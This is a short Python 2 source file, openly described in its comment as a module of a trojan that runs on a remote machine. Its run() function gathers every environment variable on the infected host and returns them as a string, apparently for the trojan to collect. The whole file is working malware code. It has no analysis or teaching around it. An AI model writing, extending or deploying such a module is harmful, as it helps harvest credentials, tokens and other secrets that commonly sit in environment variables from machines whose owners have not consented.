# This module retrieves any environment variables that are set on the remote machine
# on which trojan is executing

import os

def run(**args):
     print '[*] In environment module.'
     return str(os.environ)
